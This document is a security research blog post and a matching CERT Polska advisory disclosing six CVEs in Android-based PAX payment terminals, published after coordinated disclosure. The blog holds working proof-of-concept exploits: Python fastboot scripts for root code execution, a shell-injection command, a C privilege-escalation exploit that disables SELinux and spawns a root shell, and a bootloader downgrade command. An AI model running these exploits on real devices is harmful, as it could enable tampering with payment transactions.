=== Content from blog.stmcyber.com_fff74fe8_20250110_131949.html ===

[![STM logo](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/stm_logo.jpg)](https://www.stmcyber.pl/?lang=en)
[Research & Development](https://blog.stmcyber.com)
![](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/menu.svg)
![](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/x.svg)

* [Vulnerabilities](/vulns)
* [Company](https://www.stmcyber.pl/firma?lang=en)
* [Services](https://www.stmcyber.pl/uslugi?lang=en)
* [Academy](https://www.stm-academy.com/?lang=en)

$ #

# [Android-based PAX POS vulnerabilities (Part 1)](https://blog.stmcyber.com/pax-pos-cves-2023/)

Authors: [Adam KliÅ›](https://blog.stmcyber.com/author/aklis/), [Hubert Jasudowicz](https://blog.stmcyber.com/author/hjasudowicz/), 15.01.2024

Banking companies worldwide are finally shifting away from custom-made Point of Sale (POS) devices towards the wildly adopted and battle-tested Android operating system. No more obscure terminals; the era of giant, colorful touchscreens is here! While Android is a secure, hardened OS, implementing and integrating your own features with custom hardware requires a lot of time and effort.

STM Cyber R&D team decided to reverse engineer POS devices made by the worldwide known company PAX Technology, as they are being rapidly deployed in Poland. In this article, we present technical details of 6 vulnerabilities, which were assigned CVEs.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png)](https://blog.stmcyber.com/wp-content/uploads/2023/10/Image-Pasted-at-2023-10-2-15-12.png)

Exploited PAX A920 device

Due to heavy application sandboxing in the Android operating system (the base for the PaxDroid system present on PAX devices), applications can't interfere with each other. Still, some applications require higher privileges to control certain parts of the device, thus they are running as higher-privileged user. However, if an attacker can escalate their privileges to the`root` account, they can tamper with any application, including certain parts of payment operations. While an attacker still can't access decrypted information about the payee (like credit card information), since they are being processed in separate Secure Processor (SP), they can modify data the merchant application sends to the SP, which includes transaction amount. Obtaining access to other high-privileged accounts, such as `system`, is also valuable since it makes the attack surface to the `root` account much bigger.

While searching for vulnerabilities, STM Cyber focused on 2 attack vectors:

* Local code execution from the bootloader, which doesn't require any privileges other than access to the USB port of the device. While this requires physical access to the device, this is still an interesting attack vector due to the nature of POS devices. Since different PAX POS use different CPU vendors, they also use different bootloaders. We've found **CVE-2023-4818** when testing PAX A920, while A920Pro and A50 were vulnerable to **CVE-2023-42134** and **CVE-2023-42135**.
* Privilege escalation to `system` user. Vulnerabilities from this class are present in the PaxDroid system itself thus they are present in almost all Android-based PAX POS devices. **CVE-2023-42136** allows for privilege escalation from any user to `system` account greatly increasing attack surface.

## CVE-2023-42133 - Reserved

ğŸ™‚

## CVE-2023-42134 - Signed partition overwrite and subsequently local code execution as root via hidden bootloader command

* Product: PAX A920Pro/PAX A50/PAX A77
* CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
* Impact: Local code execution as `root`
* Known vulnerable version: PayDroid 8.1.0\_Sagittarius\_11.1.50\_20230314
* Fix verified in: PayDroid 8.1.0\_Sagittarius\_V02.9.99T9\_20230919
* CERT.PL reference: <https://cert.pl/en/posts/2024/01/CVE-2023-4818/>

By executing the hidden `oem paxassert` command in fastboot mode, it's possible to overwrite the unsigned `pax1` partition. This results in injection of kernel arguments, resulting in arbitrary code execution. Fastboot flashing handler function first checks if we're trying to flash a special partition:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83.png)

If the provided partition name is `pax1`, and `paxAssert`, the configuration will be applied:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/9a81019f-3776-479b-8a15-3d93ac7b03ec.png)

`pax1` is a special partition that doesn't contain filesystem but behaves more like a configuration map. Certain values from this map are used as kernel parameters (and allow spaces in their values), giving us kernel parameter injection.

Attached below is a PoC script, which chains kernel parameter injection with custom rootfs executed from a fastboot buffer (technique explained in depth [here](https://alephsecurity.com/2017/08/30/untethered-initroot/)).

```
from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        print("enabling paxassert")
        upload_data(b"yes\x00")
        check_status(cmd(b"oem paxassert"), b"OKAY")

        print("pushing pax1 partition")
        upload_data(f'LOCALE="pl-PL initrd=0x82000000,{initrd_size}"'.encode())

        print("flashing pax1")
        flash("pax1")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))
```
## CVE-2023-42135 - Local code execution as root via kernel parameter injection in fastboot

* Product: PAX A920Pro/PAX A50/PAX A77
* CVSS Score: CVSS 7.6 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
* Impact: Local code execution as `root`
* Known vulnerable version: PayDroid 8.1.0\_Sagittarius\_11.1.50\_20230614
* Fix verified in: PayDroid 8.1.0\_Sagittarius\_V02.9.99T9\_20230919
* CERT.PL reference: <https://cert.pl/en/posts/2024/01/CVE-2023-4818/>

Contents of an unsigned â€œpartitionâ€ namedÂ `exsn`Â are concatenated to the kernel argument list. By flashing thisÂ `exsn`Â partition, itâ€™s possible to inject arbitrary kernel arguments, resulting in arbitrary code execution.

Fastboot flashing handler function, first checks if weâ€™re trying to flash a special partition:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/545b8f39-b884-4ade-a768-4560fda57d83-1.png)

The value of `exsn` is passed in to kernel. Since `exsn` can be changed to any value, including one with spaces, it possible to inject any kernel parameters.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/33cbd702-0b7d-414f-aeac-a6e29979170c.png)

Attached below is PoC script, which chains kernel parameter injection with custom initroot executed from fastboot buffer (technique explained in depth [here](https://alephsecurity.com/2017/08/30/untethered-initroot/)).

```
from pathlib import Path
import sys
import tempfile
from contextlib import contextmanager
from usb1 import USBContext, USBError, USBDeviceHandle

# these 4 values may need to be changed on per-product basis:
PAX_VID = 0x2fb8
PAX_PID = 0x2240
ep_in = 0x85
ep_out = 0x06

# we assume this will be used only after open_fastboot
g_handle: USBDeviceHandle = None  # type: ignore

def send(bytez: bytes) -> None:
    print(f"Sending {len(bytez)} {bytez[:0x18]}...")
    g_handle.bulkWrite(ep_out, bytez)

def recv(count: int = 512) -> bytes:
    data = g_handle.bulkRead(ep_in, count)
    print("Got status", data)
    return data

def cmd(data: bytes) -> bytes:
    send(data)
    return recv()

def check_status(expected, received):
    if received != expected:
        raise RuntimeError(f"Expected status {expected}, got, {received}")

@contextmanager
def open_fastboot(*args, **kwargs):
    with USBContext() as ctx:
        device = ctx.getByVendorIDAndProductID(PAX_VID, PAX_PID)
        if device is None:
            print("Device not found")
            exit(1)
        try:
            global g_handle
            g_handle = device.open()
        except USBError:
            print("Failed to open USB device")
            exit(1)

        with g_handle.claimInterface(0):
            yield

def upload_image(path: Path) -> None:
    total_size = path.stat().st_size
    send(f"download:{total_size:08x}".encode())
    response = recv()
    check_status(b"DATA", response[:4])

    with open(path, "rb") as file:
        while True:
            data = file.read(512)
            if not data:
                break
            send(data)

    response = recv()
    check_status(b"OKAY", response)

def flash(partition_name: str) -> None:
    check_status(b"OKAY", cmd(f"flash:{partition_name}".encode()))

def upload_data(bytez: bytes) -> None:
    # yes, I know this could be done better but I'm too lazy
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(bytez)
        tmp.flush()
        upload_image(Path(tmp.name))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("invalid number of parameters, please provide image")
        sys.exit(1)

    initrd_image = Path(sys.argv[1])
    initrd_size = initrd_image.stat().st_size

    with open_fastboot():
        exsn = get_exsn()
        initrd_size = initrd_image.stat().st_size
        exsn_data = exsn + b" initrd=0x82000000," + str(int(initrd_size)).encode()
        print("exsn_data:", exsn_data)

        print("pushing exsn")
        upload_data(exsn_data)

        print("flashing exsn")
        flash("exsn")

        print("pushing initrd")
        upload_image(initrd_image)

        check_status(b"OKAY", cmd(b"continue"))
```
## CVE-2023-42136 - Privilege escalation from any user/application to system user via shell injection binder-exposed service

* Product: All Android-based PAX POS devices
* CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
* Impact: Privilege escalation from any user/application to `system` user
* Known vulnerable version: PayDroid 11.1.50\_20230614
* Fix verified in: PayDroid V02.9.99T9\_20230919
* CERT.PL reference: <https://cert.pl/en/posts/2024/01/CVE-2023-4818/>

Android service namedÂ `PaxSmartDeviceServcie`Â (typo intended) is vulnerable to shell injection, escalating any user toÂ `system`Â account. While it checks if the command starts withÂ `dumpsys`, this check can be trivially bypassed by passing inÂ `dumpsys; command`Â as an argument.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/4ec25ad4-97ee-44ae-a402-31f5032f7963.png)
```
adb shell "service call PaxSmartDeviceServcie 16 s16 'dumpsysx; id > /data/local/tmp/win'"
```
## CVE-2023-42137 - Privilege escalation from system/shell user to root via insecure operations in systool\_server daemon

* Product: All Android-based PAX POS devices
* CVSS Score: CVSS 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
* Impact: Privilege escalation from `system`/`shell` user to `root` user
* Known vulnerable version: PayDroid 11.1.50\_20230614
* Fixed verified in: PayDroid V02.9.99T9\_20230919
* CERT.PL reference: <https://cert.pl/en/posts/2024/01/CVE-2023-4818/>

`systool_server` is a daemon exposed via binder running with root privileges. It exposes an API for execution of `miniunz` command with user controller input and output directory. An attacker can inject an arbitrary amount of parameters, including additional command flags. Furthermore, given that the attacker has control over both the source directory and the destination directory (`/tmp`), they can manipulate this situation by crafting malicious symbolic links within the `/tmp` directory. This allows the attacker to overwrite arbitrary files, potentially leading to the escalation of privileges. By overwriting specific files within the `/data` partition, the attacker may exploit this vulnerability to assume the privileges of a `system` user, thereby hijacking an application that runs with system-level privileges.

`systool_server` performs multiple checks to verify caller uid and binary to ensure only verified binaries are using this API. These checks can be bypassed using good old `LD_PRELOAD`. Finally, to pop a fully interactive shell, we use mount without `nosuid` to create a suid binary. See the code below for PoC:

```
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include "binder.h"

struct binder_state *g_binder_state;
uint32_t target;

int binder_init() {
    struct binder_state* bs;
    bs = binder_open(128*1024);
    if (!bs) {
        fprintf(stderr, "failed to open binder driver\n");
        return -1;
    }
    char b[0x200];
    struct binder_io a;
    struct binder_io c;
    bio_init(&a, &b, 0x200, 4);
    bio_put_uint32(&a, 0);
    bio_put_string16_x(&a, "android.os.IServiceManager");
    bio_put_string16_x(&a, "systool_binder");
    int status = binder_call(bs, &a, &c, 0, 2);
    if (status == 0) {
        int status2 = bio_get_ref(&c);
        if (status2 != 0) {
            target = status2;
            binder_acquire(bs, status2);
        }
        binder_done(bs, &a, &c);
    }
    g_binder_state = bs;
    return 0;
}

void systoolExecShellCmdV2(char* src) {
    struct binder_io msg;
    struct binder_io reply;
    char buf[0x200];
    bio_init(&msg, buf, 0x200, 4);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, "SystoolBinder");
    bio_put_uint32(&msg, 3); // cmd
    bio_put_uint32(&msg, 1); // subcmd
    bio_put_uint32(&msg, 1); // num arguments
    bio_put_string16_x(&msg, src);
    int status = binder_call(g_binder_state, &msg, &reply, target, 18);
    if (status == 0) {
        int ret1 = bio_get_uint32(&reply);
        int ret2 = bio_get_uint32(&reply);
        binder_done(g_binder_state, &msg, &reply);
        printf("ExecShellCmdV2: ret1=%d ret2=%d\n", ret1, ret2);
    }
}

int executed = 0;

int printf(const char* __fmt, ...) {
    if (executed)
        return 0;
    executed = 1;

    pid_t pid = getpid();
    fprintf(stderr, "[*] Hello from PID %d\n", pid);
    char linkbuf[0x100];
    readlink("/proc/self/exe", linkbuf, 0x100);
    fprintf(stderr, "[*] /proc/self/exe is pointing at %s\n", linkbuf);

    binder_init();

    // prep
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] disabling fs selinux\n");
    system("ln -s /sys/fs/selinux/enforce /tmp/monitor.bin");
    system("echo -n '0' > /data/local/tmp/zero");
    systoolExecShellCmdV2("/data/local/tmp/zero");

    // cleanup
    system("rm /data/local/tmp/zero");
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] setting up suid\n");
    system("chmod +s /data/local/tmp/escalate");

    fprintf(stderr, "[*] copying suid to /mnt\n");
    system("ln -s /mnt/escalate /tmp/monitor.bin");
    systoolExecShellCmdV2("/data/local/tmp/escalate");

    // cleanup
    system("rm /tmp/monitor.bin");

    fprintf(stderr, "[*] spawning shell\n");
    execve("/mnt/escalate", NULL, NULL);

    return 0;
}
```
## CVE-2023-4818 - Bootloader downgrade via improper tokenization

* Product: PAX A920
* CVSS Score: CVSS 7.3 (AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
* Impact: Bootloader can be downgraded to a vulnerable version, resulting in local code execution as `root`
* Known vulnerable version: PayDroid 7.1.2\_Aquarius\_11.1.50\_20230614
* Fix verified in: PayDroid 7.1.2\_Aquarius\_V02.9.99T9\_20230919
* CERT.PL reference: <https://cert.pl/en/posts/2024/01/CVE-2023-4818/>

By switching to fastboot mode and flashing a partition namedÂ `aboot:`, itâ€™s possible to downgrade the bootloader to a previously vulnerable, signed version (version check is skipped).

We skip the signature and version check sinceÂ `aboot:`Â does not match any known partition name:

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/9540d621-dbd2-4bb5-8dde-84a882ca221e.png)

Then, the provided name is tokenized withÂ `:`Â - ending up with justÂ `aboot`. This way, we can bypass the version check and downgrade the bootloader.

[![](https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png)](https://blog.stmcyber.com/wp-content/uploads/2023/09/88f46489-9673-46e7-a732-3c3be12b52e8.png)
```
fastboot flash 'aboot:' aboot.img
```
## Disclosure timeline

* 07/04/2023 - first contact with vendor briefly describing vulnerabilities (no reply)
* 08/05/2023 - second attempt of contact with vendor (successful)
* 10/05/2023 - sent technical details explaining all vulnerabilities (with PoC)
* 01/08/2023 - contacted CERT.PL to assign CVEs (instant reply)
* 09/10/2023 - further contact with PAX to fix found vulnerabilities
* 30/11/2023 - STM Cyber verifies patches
* 15/01/2024 - Public release

[![STM logo](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/stm_logo.jpg)](https://stmcyber.com)
Hack the Unhackable

[![Twitter](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/twitter.svg)](https://twitter.com/stm_cyber)
[![GitHub](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/github.svg)](https://github.com/STMCyber)
[![LinkedIn](https://blog.stmcyber.com/wp-content/themes/stm_research/assets/images/linkedin.svg)](https://pl.linkedin.com/company/stm-cyber)

[[emailÂ protected]](/cdn-cgi/l/email-protection)



=== Content from cert.pl_c563cc31_20250110_131950.html ===


[ZgÃ…Â‚oÃ…Â› incydent](https://incydent.cert.pl/)

Cofnij

* JesteÃ…Â› w nawigacji
* O nas
  + O nas
  + [O zespole](../../../../o-nas/)
  + [Praca](/praca)
  + [Kontakt](../../../../kontakt/)
* [AktualnoÃ…Â›ci](../../../../news/)
* Baza wiedzy
  + Baza wiedzy
  + [FaÃ…Â‚szywe inwestycje](/falszywe-inwestycje)
  + [UwaÃ…Â¼aj na faÃ…Â‚szywe sklepy online](/falszywe-sklepy)
  + [(Nie)bezpieczne pÃ…Â‚atnoÃ…Â›ci](/baza-wiedzy/niebezpieczne-platnosci)
  + [FaÃ…Â‚szywi konsultanci](/baza-wiedzy/falszywi-konsultanci)
  + [Zadbaj o bezpieczne hasÃ…Â‚a i logowanie](/bezpieczne-hasla)
  + [FaÃ…Â‚szywe zaÃ…Â‚Ã„Â…czniki w mailach](/falszywe-zalaczniki)
  + [FaÃ…Â‚szywe proÃ…Â›by o szybki przelew](/szybkie-przelewy)
  + [FaÃ…Â‚szywe SMSy - plaga ostatnich miesiÃ„Â™cy](/baza-wiedzy/falszywe-smsy)
  + Biuletyn OUCH!
  + [Porady bezpieczeÃ…Â„stwa OUCH!](/ouch)
* Dla ekspertÃƒÂ³w
  + Dla ekspertÃƒÂ³w
  + [AktualnoÃ…Â›ci](../../../../news/)
  + [Publikacje](../../../../publikacje/)
  + [Lista OstrzeÃ…Â¼eÃ…Â„](../../../../lista-ostrzezen/)
  + [Kompendium o hasÃ…Â‚ach](/hasla/)
  + Projekty
  + [n6](../../../../n6/)
  + [Artemis](/skanowanie/)
  + [MWDB](https://mwdb.cert.pl/)
  + Program CVD
  + [Polityka CVD](../../../../cvd)
  + [Lista podatnoÃ…Â›ci](../../../../cve)

* O nas
* [AktualnoÃ…Â›ci](../../../../news/)
* Baza wiedzy
* Dla ekspertÃƒÂ³w

[ZgÃ…Â‚oÃ…Â› incydent](https://incydent.cert.pl/)

O nas
[O zespole](../../../../o-nas/)
[Praca](/praca)
[Kontakt](../../../../kontakt/)

Baza wiedzy
[FaÃ…Â‚szywe inwestycje](/falszywe-inwestycje)
[UwaÃ…Â¼aj na faÃ…Â‚szywe sklepy online](/falszywe-sklepy)
[(Nie)bezpieczne pÃ…Â‚atnoÃ…Â›ci](/baza-wiedzy/niebezpieczne-platnosci)
[FaÃ…Â‚szywi konsultanci](/baza-wiedzy/falszywi-konsultanci)
[Zadbaj o bezpieczne hasÃ…Â‚a i logowanie](/bezpieczne-hasla)
[FaÃ…Â‚szywe zaÃ…Â‚Ã„Â…czniki w mailach](/falszywe-zalaczniki)
[FaÃ…Â‚szywe proÃ…Â›by o szybki przelew](/szybkie-przelewy)
[FaÃ…Â‚szywe SMSy - plaga ostatnich miesiÃ„Â™cy](/baza-wiedzy/falszywe-smsy)

Biuletyn OUCH!
[Porady bezpieczeÃ…Â„stwa OUCH!](/ouch)

Dla ekspertÃƒÂ³w
[Publikacje](../../../../publikacje/)
[Lista OstrzeÃ…Â¼eÃ…Â„](../../../../lista-ostrzezen/)
[Kompendium o hasÃ…Â‚ach](/hasla/)

Projekty
[n6](../../../../n6/)
[Artemis](/skanowanie/)
[MWDB](https://mwdb.cert.pl/)

Program CVD
[Polityka CVD](../../../../cvd)
[Lista podatnoÃ…Â›ci](../../../../cve)

PodatnoÃ…Â›ci w terminalach pÃ…Â‚atniczych firmy PAX

15 stycznia 2024
| [CERT Polska](../../../../author/cert-polska/) | [#vulnerability](../../../../tag/vulnerability/), [#warning](../../../../tag/warning/), [#cve](../../../../tag/cve/)

| **CVE ID** | [CVE-2023-4818](https://www.cve.org/CVERecord?id=CVE-2023-4818) |
| --- | --- |
| **Data publikacji** | 15 stycznia 2024 |
| **Producent podatnego oprogramowania** | PAX Technology |
| **Nazwa podatnego oprogramowania** | A920 |
| **Podatne wersje** | Wszystkie do A920\_AP\_Boot\_Release\_V5.14 wÃ…Â‚Ã„Â…cznie |
| **Typ podatnoÃ…Â›ci (CWE)** | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') ([CWE-74](https://cwe.mitre.org/data/definitions/74.html)) |
| **Ã…Â¹rÃƒÂ³dÃ…Â‚o zgÃ…Â‚oszenia** | ZgÃ…Â‚oszenie do CERT Polska |
| **CVE ID** | [CVE-2023-42134](https://www.cve.org/CVERecord?id=CVE-2023-42134) |
| --- | --- |
| **Data publikacji** | 15 stycznia 2024 |
| **Producent podatnego oprogramowania** | PAX Technology |
| **Nazwa podatnego oprogramowania** | Wszystkie terminale firmy PAX oparte o system Android |
| **Podatne wersje** | Wszystkie do 11.1.45\_20230314 wÃ…Â‚Ã„Â…cznie |
| **Typ podatnoÃ…Â›ci (CWE)** | Hidden Functionality ([CWE-912](https://cwe.mitre.org/data/definitions/912.html)) |
| **Ã…Â¹rÃƒÂ³dÃ…Â‚o zgÃ…Â‚oszenia** | ZgÃ…Â‚oszenie do CERT Polska |
| **CVE ID** | [CVE-2023-42135](https://www.cve.org/CVERecord?id=CVE-2023-42135) |
| --- | --- |
| **Data publikacji** | 15 stycznia 2024 |
| **Producent podatnego oprogramowania** | PAX Technology |
| **Nazwa podatnego oprogramowania** | A920 Pro oraz A50 |
| **Podatne wersje** | Wszystkie do 11.1.50\_20230614 wÃ…Â‚Ã„Â…cznie |
| **Typ podatnoÃ…Â›ci (CWE)** | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') ([CWE-74](https://cwe.mitre.org/data/definitions/74.html)) |
| **Ã…Â¹rÃƒÂ³dÃ…Â‚o zgÃ…Â‚oszenia** | ZgÃ…Â‚oszenie do CERT Polska |
| **CVE ID** | [CVE-2023-42136](https://www.cve.org/CVERecord?id=CVE-2023-42136) |
| --- | --- |
| **Data publikacji** | 15 stycznia 2024 |
| **Producent podatnego oprogramowania** | PAX Technology |
| **Nazwa podatnego oprogramowania** | Wszystkie terminale oparte o system Android |
| **Podatne wersje** | Wszystkie do 11.1.50\_20230614 wÃ…Â‚Ã„Â…cznie |
| **Typ podatnoÃ…Â›ci (CWE)** | Improper Neutralization of Special Elements used in a Command ('Command Injection') ([CWE-77](https://cwe.mitre.org/data/definitions/77.html)) |
| **Ã…Â¹rÃƒÂ³dÃ…Â‚o zgÃ…Â‚oszenia** | ZgÃ…Â‚oszenie do CERT Polska |
| **CVE ID** | [CVE-2023-42137](https://www.cve.org/CVERecord?id=CVE-2023-42137) |
| --- | --- |
| **Data publikacji** | 15 stycznia 2024 |
| **Producent podatnego oprogramowania** | PAX Technology |
| **Nazwa podatnego oprogramowania** | Wszystkie terminale oparte o system Android |
| **Podatne wersje** | Wszystkie do 11.1.50\_20230614 wÃ…Â‚Ã„Â…cznie |
| **Typ podatnoÃ…Â›ci (CWE)** | Improper Link Resolution Before File Access ('Link Following') ([CWE-59](https://cwe.mitre.org/data/definitions/59.html)) |
| **Ã…Â¹rÃƒÂ³dÃ…Â‚o zgÃ…Â‚oszenia** | ZgÃ…Â‚oszenie do CERT Polska |

## Opis podatnoÃ…Â›ci

CERT Polska otrzymaÃ…Â‚ zgÃ…Â‚oszenie o podatnoÃ…Â›ciach w oprogramowaniu rÃƒÂ³Ã…Â¼nych modeli terminali pÃ…Â‚atniczych POS (Point Of Sale) firmy PAX i koordynowaÃ…Â‚ proces ujawniania informacji. Wszystkie podatnoÃ…Â›ci zostaÃ…Â‚y potwierdzone przez producenta oraz otrzymaÃ…Â‚y adresujÃ„Â…ce je poprawki bezpieczeÃ…Â„stwa. SzczegÃƒÂ³Ã…Â‚y techniczne zostaÃ…Â‚y opisane na [stronie znalazcÃƒÂ³w bÃ…Â‚Ã„Â™dÃƒÂ³w](https://blog.stmcyber.com/pax-pos-cves-2023/).

* BÃ…Â‚Ã„Â™dne sprawdzanie wersji opisane w podatnoÃ…Â›ci [CVE-2023-4818](https://www.cve.org/CVERecord?id=CVE-2023-4818) w urzÃ„Â…dzeniu PAX A920 pozwala na wgranie starszej wersji bootloadera pod warunkiem, Ã…Â¼e jest on poprawnie podpisany przez firmÃ„Â™ PAX. Do przeprowadzenia ataku wymagany jest dostÃ„Â™p do portu USB urzÃ„Â…dzenia.
* PodatnoÃ…Â›Ã„Â‡ [CVE-2023-42134](https://www.cve.org/CVERecord?id=CVE-2023-42134) we wszystkich urzÃ„Â…dzeniach POS opartych o system Android z oprogramowaniem w wersji PayDroid\_8.1.0\_Sagittarius\_V11.1.45\_20230314 lub niÃ…Â¼szej pozwala skorzystaÃ„Â‡ w nieudokumentowanej komendy aby nadpisaÃ„Â‡ podpisanÃ„Â… partycjÃ„Â™, w konsekwencji czego moÃ…Â¼liwe jest lokalne wykonanie kodu. Do przeprowadzenia ataku wymagany jest dostÃ„Â™p do portu USB urzÃ„Â…dzenia.
* PodatnoÃ…Â›Ã„Â‡ [CVE-2023-42135](https://www.cve.org/CVERecord?id=CVE-2023-42135) w urzÃ„Â…dzeniach PAX A920Pro oraz A50 z oprogramowaniem PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 opisuje ominiÃ„Â™cie walidacji wprowadzanych do urzÃ„Â…dzenia danych podczas flashowania jednej z partycji, dziÃ„Â™ki czemu moÃ…Â¼liwe jest wstrzykniÃ„Â™cie dodatkowego parametru i lokalne wykonanie kodu.
  Do przeprowadzenia ataku wymagany jest dostÃ„Â™p do portu USB urzÃ„Â…dzenia.
* PodatnoÃ…Â›Ã„Â‡ [CVE-2023-42136](https://www.cve.org/CVERecord?id=CVE-2023-42136) we wszystkich urzÃ„Â…dzeniach POS opartych o system Android z oprogramowaniem w wersji PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 lub niÃ…Â¼szej pozwala na lokalne wykonanie komend z przywilejami konta systemowego poprzez wstrzykniÃ„Â™cie spreparowanego polecenia powÃ…Â‚oki. Do przeprowadzenia ataku wymagany jest dostÃ„Â™p do powÃ…Â‚oki urzÃ„Â…dzenia.
* PodatnoÃ…Â›Ã„Â‡ [CVE-2023-42137](https://www.cve.org/CVERecord?id=CVE-2023-42137) we wszystkich urzÃ„Â…dzeniach POS opartych o system Android z oprogramowaniem w wersji PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 lub niÃ…Â¼szej pozwala na wykonanie komend z wysokimi uprawnieniami poprzez uÃ…Â¼ycie spreparowanych dowiÃ„Â…zaÃ…Â„ symbolicznych. Do przeprowadzenia ataku wymagany jest dostÃ„Â™p do powÃ…Â‚oki urzÃ„Â…dzenia.

## PodziÃ„Â™kowania

Za zgÃ…Â‚oszenie podatnoÃ…Â›ci dziÃ„Â™kujemy Hubertowi Jasudowiczowi, Adamowi Klisiowi oraz pozostaÃ…Â‚ym czÃ…Â‚onkom zespoÃ…Â‚u STM Cyber R&D.

---

WiÃ„Â™cej o procesie zgÃ…Â‚aszania podatnoÃ…Â›ci moÃ…Â¼na przeczytaÃ„Â‡ na stronie <https://cert.pl/cvd/>.

CERT Polska to zespÃƒÂ³Ã…Â‚ dziaÃ…Â‚ajÃ„Â…cy w strukturach NASK - PaÃ…Â„stwowego Instytutu Badawczego,
powoÃ…Â‚any w 1996 roku do reagowania na incydenty bezpieczeÃ…Â„stwa komputerowego. Realizuje
zadania CSIRT NASK, jednego z trzech takich zespoÃ…Â‚ÃƒÂ³w dziaÃ…Â‚ajÃ„Â…cych na poziomie
krajowym w ramach krajowego systemu cyberbezpieczeÃ…Â„stwa.

# CERT Polska w social mediach

[![](/theme/assets/img/img.gif)Facebook](https://www.facebook.com/CERT.Polska/)
[![](/theme/assets/img/img.gif)X](https://x.com/CERT_Polska)
[![](/theme/assets/img/img.gif)LinkedIn](https://www.linkedin.com/showcase/cert-polska)
[![](/theme/assets/img/img.gif)GitHub](https://github.com/CERT-Polska)

# Kontakt

ul. Kolska 12, 01-045 Warszawa

ePUAP: /NASK-Instytut/SkrytkaESP

e-DorÃ„Â™czenia: AE:PL-60057-61611-BCEGR-11

e-mail: [[emailÂ protected]](/cdn-cgi/l/email-protection#91f8fff7fed1f2f4e3e5bfe1fd)

ZgÃ…Â‚aszanie incydentÃƒÂ³w: [incydent.cert.pl](https://incydent.cert.pl/)

[[emailÂ protected]](/cdn-cgi/l/email-protection#3754524543775452454319475b)

![WspÃƒÂ³Ã…Â‚finansowane przez instrument Unii Europejskiej Ã…ÂÃ„Â…czÃ„Â…c EuropÃ„Â™](/theme/assets/img/ue.png)

* Ã‚Â© 2025 [NASK](https://nask.pl/)
* [Polityka prywatnoÃ…Â›ci](/uploads/misc/privacy-policy.pdf)
